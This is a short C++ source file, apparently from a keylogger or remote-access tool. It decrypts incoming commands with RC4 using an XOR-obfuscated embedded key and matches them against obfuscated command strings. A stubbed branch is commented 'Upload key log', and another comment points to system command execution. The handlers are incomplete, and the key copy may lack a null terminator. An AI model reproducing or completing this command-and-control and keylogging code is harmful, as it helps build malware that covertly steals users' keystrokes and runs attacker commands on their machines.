#include "cmder.hpp"

std::string xecodeMsg(std::string xmsg)
{
    char cpk[31];

    strncpy(cpk, INET_KEY, sizeof(cpk));
    unxor(cpk);

    std::string key(cpk);

    xRC4 r(key);

    return r.encrypt(xmsg);
}

int handleCommands(std::string cmd)
{
    std::cout << cmd << std::endl;
    std::string xCmd = xecodeMsg(cmd);

    std::cout << xCmd << std::endl;

    char download[] = "\x64\x6e\x75\x6d\x68\x6a\x67\x63";
    unxor(download);

    if (xCmd == download)
    {
        // Upload key log
    }

    // system

    return -1;
}